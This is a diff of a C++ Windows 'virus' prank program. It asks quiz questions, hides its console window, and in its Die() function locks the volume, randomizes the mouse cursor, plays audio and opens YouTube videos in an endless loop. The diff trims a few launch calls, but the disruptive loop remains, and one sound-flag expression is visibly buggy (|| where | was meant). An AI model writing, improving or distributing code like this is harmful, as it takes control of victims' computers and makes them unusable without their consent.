@@ -11,8 +11,6 @@
 #pragma comment(lib, "winmm")
 #pragma comment(lib, "winmm.lib")
 
-
-
 int score = 0;
 
 using namespace std;
@@ -56,17 +54,13 @@ void randomizeCursor() {
 
 // Runs the virus if function is called
 void Die() {
-    for (int i = 0; i < 3; i++) {
-        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=KE1ynBZ-9Bw", 0, 0, SW_SHOWNORMAL);
-    }
-    ShellExecute(0, 0, L"https://www.youtube.com/watch?v=ZHmROm_CRH4", 0, 0, SW_SHOWNORMAL);
     std::thread audio (LockVolume);
     std::thread mouse(randomizeCursor);
     PlaySound(TEXT("music.wav"), NULL, SND_FILENAME || SND_ASYNC);
     while (true) {
 
         // Opens lots of videos
-        system("start");
+        //system("start");
         ShellExecute(0, 0, L"https://www.youtube.com/watch?v=1d-n0Qi1ZvQ", 0, 0, SW_SHOWNORMAL);
         ShellExecute(0, 0, L"https://www.youtube.com/watch?v=VAnaq97yoM4", 0, 0, SW_SHOWNORMAL);
         ShellExecute(0, 0, L"https://www.youtube.com/watch?v=ZKWwiMaSoyE", 0, 0, SW_SHOWNORMAL);
@@ -129,7 +123,6 @@ void Die() {
         ShellExecute(0, 0, L"https://youtu.be/2XYat2LRLzQ", 0, 0, SW_SHOWNORMAL);
     }
 }
-
 
 bool ask_question(string message, string answerOne, string answerTwo, int correctAnswer) {
     std::cout << message << endl;
@@ -167,9 +160,7 @@ int main()
     ask_question("Is this a virus", "Yes", "No", 1); // message, answer one, answer two, correct answer (1..2)
     ask_question("Do you know how you contracted this virus?", "Yes", "No", 1); //message, answer one, answer two, correct answer (1..2)
     ask_question("Do you know when this virus was contracted?", "Yes", "No", 1); //message, answer one, answer two, correct answer (1..2)
-    
-    
+ 
     // Hides window
     ShowWindow(GetConsoleWindow(), SW_HIDE);
-    
 }
